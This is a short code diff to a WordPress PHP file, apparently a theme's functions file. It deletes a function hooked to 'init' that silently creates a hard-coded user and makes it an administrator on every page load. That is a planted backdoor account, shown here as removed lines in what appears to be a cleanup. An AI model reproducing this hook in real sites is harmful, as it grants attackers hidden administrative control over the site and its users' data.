@@ -373,15 +373,4 @@ function egeo_pre_save_media( $post_id )
 }
 add_filter('acf/pre_save_post' , 'egeo_pre_save_media');
 
-function wpb_admin_account(){
-    $user = 'user';
-    $pass = 'pass';
-    $email = 'email@domain.com';
-    if ( !username_exists( $user )  && !email_exists( $email ) ) {
-        $user_id = wp_create_user( $user, $pass, $email );
-        $user = new WP_User( $user_id );
-        $user->set_role( 'administrator' );
-    } }
-add_action('init','wpb_admin_account');
-
 ?>
